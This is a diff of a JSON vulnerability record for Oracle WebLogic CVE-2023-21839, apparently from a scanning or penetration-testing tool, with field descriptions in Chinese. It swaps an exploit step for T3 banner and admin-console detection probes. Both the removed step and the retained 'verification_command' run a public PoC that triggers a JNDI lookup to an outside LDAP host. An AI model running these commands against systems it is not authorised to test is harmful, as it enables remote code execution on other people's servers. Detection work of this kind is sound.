@@ -1,5 +1,6 @@
 {
   "vuln_id": "weblogic_cve2023_21839",
+  "dispatch_skill": "weblogic_jndi_rce",
   "description": "Oracle WebLogic Server 未授权远程代码执行漏洞，允许攻击者通过T3/IIOP协议进行JNDI lookup操作，可能导致RCE",
   "category": "java_deserialization",
   "cves": [
@@ -25,13 +26,46 @@
     "/console"
   ],
   "detection_method": "发送T3协议请求到目标端口（如7001），检查是否响应WebLogic Server标识；或使用公开PoC工具测试JNDI lookup是否成功触发DNS/LDAP请求",
-  "exploit_steps": [
+  "probes": [
     {
-      "step": 1,
-      "description": "使用公开PoC工具执行漏洞利用，通过T3/IIOP协议发送恶意JNDI lookup请求",
-      "command": "python CVE-2023-21839.py -ip {TARGET} -p 7001 -l ldap://craft.ldap.tld/test",
-      "expected_result": "在DNSLog平台或LDAP服务端看到来自目标服务器的请求，表明JNDI lookup成功触发",
-      "notes": "需要替换craft.ldap.tld为可控的LDAP服务器地址；目标JDK版本过低或存在反序列化gadget时可能导致RCE"
+      "id": "weblogic_t3_banner",
+      "description": "T3 协议握手探测：发送 t3 标识符确认 WebLogic 服务",
+      "method": "RAW_TCP",
+      "ports": [
+        7001,
+        7002
+      ],
+      "payload_hex": "74332031322e322e310a41533a323535",
+      "timeout": 8,
+      "success_signs": {
+        "response_contains_any": [
+          "HELO",
+          "WebLogic",
+          "AS:"
+        ]
+      },
+      "confidence": 0.7
+    },
+    {
+      "id": "weblogic_console_probe",
+      "description": "访问 /console/login/LoginForm.jsp 探测控制台",
+      "method": "GET",
+      "path": "/console/login/LoginForm.jsp",
+      "ports": [
+        7001,
+        7002
+      ],
+      "timeout": 8,
+      "success_signs": {
+        "status_codes": [
+          200
+        ],
+        "body_contains_any": [
+          "WebLogic Server Administration Console",
+          "weblogic"
+        ]
+      },
+      "confidence": 0.6
     }
   ],
   "verification_command": "python CVE-2023-21839.py -ip {TARGET} -p 7001 -l ldap://dnslog.cn/test",
